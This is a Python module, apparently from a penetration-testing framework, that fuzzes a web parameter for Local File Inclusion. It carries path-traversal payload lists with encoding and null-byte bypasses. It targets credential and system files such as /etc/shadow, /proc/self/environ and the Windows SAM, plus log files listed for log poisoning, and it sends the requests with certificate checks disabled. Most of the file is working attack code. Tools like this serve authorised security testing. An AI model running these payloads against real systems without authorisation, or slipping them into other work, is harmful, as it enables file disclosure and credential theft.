#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import time
import re

class Module(Auxiliary, Http_client):


    __info__ = {
        'name': 'LFI Fuzzer',
        'description': 'Fuzzing module for Local File Inclusion vulnerabilities. Tests various LFI bypass techniques and payloads.',
        'author': 'KittySploit Team',
        'tags': ['web', 'lfi', 'fuzzing', 'scanner'],
        'references': [
            'https://owasp.org/www-community/vulnerabilities/Path_Traversal',
            'https://portswigger.net/web-security/file-path-traversal'
        ]
    }

    # Options du module
    target = OptString("", "Target URL with LFI parameter (e.g., http://target.com/page.php?file=)", required=True)
    parameter = OptString("file", "Parameter name to fuzz (e.g., file, page, include)", required=False)
    wordlist = OptString("", "Custom wordlist file path (optional)", required=False)
    threads = OptInteger(5, "Number of threads for concurrent requests", required=False)
    timeout = OptInteger(10, "Request timeout in seconds", required=False)
    delay = OptInteger(1, "Delay between requests in milliseconds", required=False)
    
    # Payloads LFI de base
    BASE_PAYLOADS = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/auth.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/vsftpd.log",
        "/var/log/sshd.log",
        "/var/log/mail.log",
        "/var/log/syslog",
        "/etc/passwd%00",
        "/etc/passwd\x00",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    ]
    
    # Techniques de bypass
    BYPASS_TECHNIQUES = [
        "",  # Pas de bypass
        "../",
        "..\\",
        "..%2F",
        "..%252F",
        "..%c0%af",
        "..%c1%9c",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "..;/",
        "..%3B/",
    ]
    
    # Fichiers Windows
    WINDOWS_FILES = [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\boot.ini",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\config\\system",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\System32\\inetsrv\\MetaBase.xml",
    ]
    
    # Fichiers Linux/Unix
    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/etc/motd",
        "/etc/group",
        "/etc/resolv.conf",
        "/etc/network/interfaces",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
    ]
    
    # Logs à tester pour log poisoning
    LOG_FILES = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/vsftpd.log",
        "/var/log/sshd.log",
        "/var/log/mail.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/usr/local/apache/logs/access_log",
        "/usr/local/apache/logs/error_log",
    ]
    
    def check(self):
        """
        Vérifie si la cible est accessible
        """
        if not self.target.value:
            print_error("Target URL is required")
            return False
        
        print_info(f"Checking target: {self.target.value}")
        
        try:
            # Test de connexion basique
            response = self.http_request(method="GET", path="/")
            if response:
                print_success(f"Target is reachable (Status: {response.status_code})")
                return True
            else:
                print_error("Target is not reachable")
                return False
        except Exception as e:
            print_error(f"Error checking target: {str(e)}")
            return False
    
    def generate_payloads(self):
        """
        Génère une liste de payloads LFI à tester
        """
        payloads = []
        
        # Ajouter les payloads de base
        payloads.extend(self.BASE_PAYLOADS)
        
        # Générer des payloads avec différentes techniques de bypass
        test_files = self.LINUX_FILES + self.LOG_FILES
        
        for bypass in self.BYPASS_TECHNIQUES:
            for file_path in test_files[:10]:  # Limiter pour éviter trop de payloads
                if bypass:
                    # Extraire le nom du fichier
                    filename = file_path.split('/')[-1]
                    payload = f"{bypass}{filename}"
                else:
                    payload = file_path
                payloads.append(payload)
        
        # Ajouter des payloads avec encodage
        for file_path in self.LINUX_FILES[:5]:
            # Double encoding
            encoded = file_path.replace('/', '%252F')
            payloads.append(encoded)
            
            # Unicode encoding
            unicode_encoded = file_path.replace('../', '..%c0%af')
            payloads.append(unicode_encoded)
        
        # Dédupliquer
        payloads = list(set(payloads))
        
        return payloads
    
    def test_payload(self, payload):
        """
        Teste un payload LFI spécifique
        """
        try:
            from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
            import requests
            import urllib3
            
            # Désactiver les avertissements SSL
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            # Parser l'URL cible
            parsed = urlparse(self.target.value)
            
            # Construire les paramètres de requête
            params = parse_qs(parsed.query)
            params[self.parameter.value] = [payload]
            
            # Reconstruire l'URL avec le nouveau paramètre
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            # Utiliser requests directement pour plus de flexibilité
            response = requests.get(
                new_url,
                timeout=self.timeout.value,
                verify=False,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if not response:
                return None
            
            # Analyser la réponse
            return self.analyze_response(response, payload)
            
        except Exception as e:
            print_debug(f"Error testing payload {payload}: {str(e)}")
            return None
    
    def analyze_response(self, response, payload):
        """
        Analyse la réponse pour détecter une vulnérabilité LFI
        """
        content = response.text if hasattr(response, 'text') else str(response.content)
        status_code = response.status_code if hasattr(response, 'status_code') else 0
        
        # Indicateurs de succès LFI
        success_indicators = [
            'root:x:0:0',  # /etc/passwd
            'daemon:',  # /etc/passwd
            'bin/bash',  # /etc/passwd
            'Linux version',  # /proc/version
            'BOOT_IMAGE',  # /proc/cmdline
            'HTTP_USER_AGENT',  # /proc/self/environ
            'DOCUMENT_ROOT',  # /proc/self/environ
            'SERVER_SOFTWARE',  # /proc/self/environ
            'Apache/',  # Logs Apache
            'nginx/',  # Logs Nginx
            'GET /',  # Logs d'accès
            'POST /',  # Logs d'accès
        ]
        
        # Indicateurs d'erreur (faux positifs)
        error_indicators = [
            '404 Not Found',
            'File not found',
            'Access Denied',
            'Permission denied',
            'Internal Server Error',
            'Error 500',
        ]
        
        # Vérifier les indicateurs de succès
        for indicator in success_indicators:
            if indicator.lower() in content.lower():
                # Vérifier que ce n'est pas une page d'erreur
                is_error = any(err.lower() in content.lower() for err in error_indicators)
                
                if not is_error and len(content) > 50:  # Éviter les faux positifs courts
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'status_code': status_code,
                        'indicator': indicator,
                        'content_length': len(content),
                        'content_preview': content[:200]
                    }
        
        return {
            'vulnerable': False,
            'payload': payload,
            'status_code': status_code,
            'content_length': len(content)
        }
    
    def run(self):
        """
        Exécute le fuzzing LFI
        """
        # Initialiser les listes de résultats
        self.vulnerable_params = []
        self.successful_payloads = []
        
        print_status("Starting LFI fuzzing...")
        print_info(f"Target: {self.target.value}")
        print_info(f"Parameter: {self.parameter.value}")
        print_info(f"Threads: {self.threads.value}")
        print_info("")
        
        # Générer les payloads
        payloads = self.generate_payloads()
        print_status(f"Generated {len(payloads)} payloads to test")
        print_info("")
        
        # Tester chaque payload
        tested = 0
        vulnerable_count = 0
        
        for payload in payloads:
            tested += 1
            print_info(f"[{tested}/{len(payloads)}] Testing: {payload[:50]}...")
            
            result = self.test_payload(payload)
            
            if result and result.get('vulnerable'):
                vulnerable_count += 1
                print_success(f"\n[!] VULNERABLE: {payload}")
                print_info(f"    Status: {result.get('status_code')}")
                print_info(f"    Indicator: {result.get('indicator')}")
                print_info(f"    Content length: {result.get('content_length')} bytes")
                print_info(f"    Preview: {result.get('content_preview', '')[:100]}...")
                print_info("")
                
                self.successful_payloads.append(result)
                self.vulnerable_params.append({
                    'parameter': self.parameter.value,
                    'payload': payload,
                    'result': result
                })
            
            # Délai entre les requêtes (convertir millisecondes en secondes)
            if self.delay.value > 0:
                time.sleep(self.delay.value / 1000.0)
        
        # Résumé
        print_info("")
        print_status("=" * 60)
        print_status("Fuzzing completed!")
        print_status(f"Total payloads tested: {tested}")
        print_status(f"Vulnerable payloads found: {vulnerable_count}")
        print_status("=" * 60)
        
        if self.successful_payloads:
            print_success("\nVulnerable payloads:")
            for i, result in enumerate(self.successful_payloads, 1):
                print_info(f"  {i}. {result.get('payload')}")
                print_info(f"     Indicator: {result.get('indicator')}")
        return True
